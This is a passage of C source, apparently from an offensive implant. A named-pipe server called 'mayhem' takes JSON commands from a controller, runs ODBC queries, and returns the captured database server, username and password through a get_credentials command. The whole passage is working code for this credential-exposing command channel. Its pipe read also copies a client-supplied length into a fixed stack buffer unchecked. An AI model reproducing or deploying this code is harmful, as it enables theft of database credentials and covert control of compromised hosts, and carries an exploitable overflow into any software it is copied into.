				cJSON_AddItemToArray(row, cJSON_CreateString(pThisBind->szBuffer));
			}
		}
		cJSON_AddItemToArray(res_values, row);
	} while (!fNoData);

	cJSON_AddItemToObject(result, "names", res_names);
	cJSON_AddItemToObject(result, "values", res_values);

	while (pFirstBind) {
		pThisBind = pFirstBind->sNext;
		if (pFirstBind->szBuffer) {
			free(pFirstBind->szBuffer);
		}
		free(pFirstBind);
		pFirstBind = pThisBind;
	}

	SQLFreeStmt(hndlStatement, SQL_CLOSE);
	return ERROR_SUCCESS;
}

DWORD command_get_credentials(cJSON *parameters, cJSON *result) {
	if (creds.server_a == NULL) {
		cJSON_AddItemToObject(result, "server", cJSON_CreateNull());
	} else {
		cJSON_AddItemToObject(result, "server", cJSON_CreateString(creds.server_a));
	}
	if (creds.username_a == NULL) {
		cJSON_AddItemToObject(result, "username", cJSON_CreateNull());
	} else {
		cJSON_AddItemToObject(result, "username", cJSON_CreateString(creds.username_a));
	}
	if (creds.password_a == NULL) {
		cJSON_AddItemToObject(result, "password", cJSON_CreateNull());
	} else {
		cJSON_AddItemToObject(result, "password", cJSON_CreateString(creds.password_a));
	}
	return ERROR_SUCCESS;
}

DWORD command_status(cJSON *parameters, cJSON *result) {
	DWORD dwStatus;

	if (hndlEnv == NULL) {
		dwStatus = ERROR_NO_HANDLE;
	} else {
		dwStatus = ERROR_SUCCESS;
	}
	return dwStatus;
}

DWORD validate_parameters(Command *cmd_handler, cJSON *request_parameters) {
	Parameters *param_cursor = NULL;
	cJSON *test_param = NULL;

	if (!cmd_handler->required_parameters) {
		return ERROR_SUCCESS;
	} else if (!request_parameters) {
		return ERROR_MISSING_PARAMETER;
	}
	for (param_cursor = cmd_handler->required_parameters; param_cursor->name; param_cursor++) {
		test_param = cJSON_GetObjectItem(request_parameters, param_cursor->name);
		if (!test_param) {
			return ERROR_MISSING_PARAMETER;
		}
		if (test_param->type != param_cursor->type) {
			return ERROR_INVALID_PARAMETER;
		}
	}
	return ERROR_SUCCESS;
}

int main_routine(void *option) {
	DWORD dwResult = TRUE;
	DWORD dwBytes;
	DWORD dwBytesWritten;
	DWORD dwBytesRead;
	HANDLE hPipe;
	cJSON *request = NULL;
	cJSON *request_command = NULL;
	cJSON *response = NULL;
	char *command = NULL;
	char *response_buffer = NULL;
	char request_buffer[BUFFER_SIZE];
	Command *command_handler = NULL;

	hPipe = CreateNamedPipe("\\\\.\\pipe\\mayhem", PIPE_ACCESS_DUPLEX, (PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT), 1, 0, 0, 50000, NULL);
	while (TRUE) {
		ConnectNamedPipe(hPipe, NULL);
		do {
			ZeroMemory(request_buffer, sizeof(request_buffer));
			if (request) {
				cJSON_Delete(request);
				request = NULL;
			}
			if (response) {
				cJSON_Delete(response);
				response = NULL;
			}
			if (response_buffer) {
				free(response_buffer);
				response_buffer = NULL;
			}

			if (!ReadFile(hPipe, &dwBytes, sizeof(dwBytes), &dwBytesRead, NULL)) {
				break;
			}
			if (!ReadFile(hPipe, &request_buffer, dwBytes, &dwBytesRead, NULL)) {
				break;
			}

			request = cJSON_Parse(request_buffer);
			if (!request) {
				break;
			}
			request_command = cJSON_GetObjectItem(request, "command");
			if ((!request_command) || (request_command->type != cJSON_String)) {
				break;
			}
			command = request_command->valuestring;
			response = cJSON_CreateObject();
			cJSON_AddItemToObject(response, "result", cJSON_CreateObject());

			dwResult = ERROR_UNKNOWN_COMMAND;
			for (command_handler = &dispatch_table[0]; command_handler->method_name; command_handler++) {
				if (strcmp(command_handler->method_name, command) != 0) {
					continue;
				}
				dwResult = validate_parameters(command_handler, cJSON_GetObjectItem(request, "parameters"));
				if (dwResult != ERROR_SUCCESS) {
					break;
				}
				dwResult = command_handler->handler(cJSON_GetObjectItem(request, "parameters"), cJSON_GetObjectItem(response, "result"));
				break;
			}

			cJSON_AddNumberToObject(response, "status", dwResult);
			response_buffer = cJSON_Print(response);
			cJSON_Minify(response_buffer);

			dwBytes = strlen(response_buffer);
			WriteFile(hPipe, &dwBytes, sizeof(dwBytes), &dwBytesWritten, NULL);
			if (!WriteFile(hPipe, response_buffer, dwBytes, &dwBytesWritten, NULL)) {
				break;
			}
		} while (TRUE);
		DisconnectNamedPipe(hPipe);
	}
	return 0;
}
